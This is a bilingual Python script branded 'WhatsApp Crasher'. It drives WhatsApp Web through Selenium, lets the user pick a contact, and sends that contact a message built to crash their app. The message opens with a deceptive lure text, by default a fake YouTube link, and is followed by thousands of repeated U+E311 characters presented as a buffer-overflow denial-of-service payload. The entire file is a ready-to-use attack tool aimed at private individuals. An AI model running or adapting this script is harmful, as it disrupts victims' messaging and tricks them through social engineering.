#!/usr/bin/python
#-*- coding: utf-8 -*-

'''
    Programa para abrir whatsapp web, y hacer un buffer overflow, 
    causando un denial of service(DOS).
'''

import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import sys
import time
from time import sleep

WEB = 'https://web.whatsapp.com' #web to open

HEADER  = '\033[95m'
OKBLUE  = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL    = '\033[91m'
ENDC    = '\033[0m'

Languages = ['English','Spanish']

print '¿English/Español?(1/2)'
seleccion = 0
while seleccion != 1 and seleccion != 2:
  seleccion = int(raw_input('>> '))

seleccion = seleccion-1
lan = Languages[seleccion]

bannerP = '''
            ╦ ╦┬ ┬┌─┐┌┬┐┌─┐┌─┐┌─┐┌─┐  
            ║║║├─┤├─┤ │ └─┐├─┤├─┘├─┘  
            ╚╩╝┴ ┴┴ ┴ ┴ └─┘┴ ┴┴  ┴    
            ╔═╗┬─┐┌─┐┌─┐┬ ┬┌─┐┬─┐     
            ║  ├┬┘├─┤└─┐├─┤├┤ ├┬┘     
            ╚═╝┴└─┴ ┴└─┘┴ ┴└─┘┴└─     
'''
banner = '''
         ### ###                         ### ###
         #######                         #######
         #######      %s#############%s      #######
             ###     %s###############%s    ###
              ###   %s#################%s  ###
               ###%s####################%s###
                 %s########################
                ###########################%s
        %s###########################################
        ###########################################%s
                ###########################
                ######     #####     ######
                #####       ###       #####
                #####       ###       #####
                ######     #####     ######
                 #########################
                  #######################
                   #####################
                 ###  ###############  ###
                ###  #################  ###
               ###   -----------------   ###
          #######    #################    #######
          #######     ###############     #######
          ### ###      #############      ### ###
                        
                        VERSION: %s
                        PROGRAMMER: %s


'''%(WARNING,ENDC,WARNING,ENDC,WARNING,ENDC,WARNING,ENDC,FAIL,ENDC,WARNING,ENDC,'1.0','eijk & Fare9')            

print banner
print bannerP

if lan=='English':
  print '///WELCOME TO WHATSAPP CRASHER PRESS ENTER TO CONTINUE\\\\\\'
else:
  print '///BIENVENIDO A WHATSAPP CRASHER PRESIONA ENTER PARA CONTINUAR\\\\\\'

raw_input()

if lan=='English':
  print '[+] Opening Browser with web'
else:
    print '[+] Abriendo Navegador con la web'

driver = webdriver.Firefox()
driver.get(WEB)

sleep(5)

if lan=='English':
  print '[+] Open whatsapp with QR code, press Enter when finish...'
else:
  print '[+] Abre whatsapp con el codigo QR, pulsa enter cuando lo tengas...'

raw_input()

#miramos a ver si esta el avatar para ver si se ha metido en whatsapp
avatar = None

try:
    avatar = driver.find_elements_by_xpath("//div[@id='app']/div/div/div/header/div/div[@class='avatar icon-user-default']/img")[0]
    #avatar.click()
except Exception as e:
    print '[-] ERROR BUSCANDO:',e


if avatar == None:
    if lan=='English':
      print "[-] Sorry you're not in whatsapp web"
    else: 
      print '[-] Lo siento no se encuentra en whatsapp web'
    sys.exit(-1)
else:
    if lan=='English':
      print '[+] Welcome "Start the game"'
    else:
      print '[+] Bienvenido "Empieza el juego"'

#ahora buscamos el input de los nombres de usuario
try:
    buscador = driver.find_elements_by_xpath("//div[@id='app']/div/div/div/div/div/label/input[@class='input input-search']")[0]
    buscador.click()
    if lan=='English':
      nombreUsuario = raw_input('Name to find>> ')
    else:
      nombreUsuario = raw_input("Nombre usuario a buscar>> ")
    buscador.send_keys(nombreUsuario)
    buscador.send_keys(Keys.ENTER)
except Exception as e:
    print '[-] ERROR BUSCANDO buscador:',e


#ahora vamos a buscar la caja del usuario para clickar y entrar en el chat
try:
    userBox = driver.find_elements_by_xpath("//div[@class='infinite-list-viewport']/div")
    index = 0
    if len(userBox) > 1:
        if lan=='English':
          index = int(raw_input('More than one,select one (1 to N): '))
        else:
          index = int(raw_input('Hay mas de uno a cual quieres acceder (1 a N): '))
        index -= 1

    userBox[index].click()
except Exception as e:
    print '[-] ERROR BUSCANDO userBox:',e

SocialE = ''
if lan=='English':
  SocialE = raw_input("Insert a text to make the message look real: ")
else:
  SocialE = raw_input("Introduzca un texto para que el mensaje parezca real: ")

if len(SocialE) == 0:
  if lan=='English':
    print "[+] You haven't written a text, choosing one by default: 'you\'ve got to see this! http://youtube.com/...'"
    SocialE = 'you\'ve got to see this! http://youtube.com/...'
  else:
    print '[+] No ha elegido texto, usando uno por defecto: "Mira que pasada! http://youtube.com/..."'
    SocialE = 'Mira que pasada! http://youtube.com/...'

#ahora buscamos la caja de input y enviamos un mensaje
try:
    #print '[+] Buscando inputBox'
    inputBox = driver.find_elements_by_xpath("//div[@class='block-compose']/div[@class='input-container']/div[@class='input-emoji']/div[@class='input']")[0]
    inputBox.click()
    fuzzer = u"\uE311" * 100
    inputBox.send_keys(SocialE)
    if lan=='English':
    	print '[+] Wait a moment we are writing the message'
    else:
    	print '[+] Espere un momento estamos escribiendo el mensaje'
    for i in range(70):
        inputBox.send_keys(fuzzer)
    inputBox.send_keys(Keys.ENTER)
except Exception as e:
    print '[-] ERROR BUSCANDO inputBox:',e

if lan=='English':
  print '[+] Press Enter to finish'
else:
  print '[+] Ataque finalizado presiona enter para acabar'

raw_input()

driver.close()

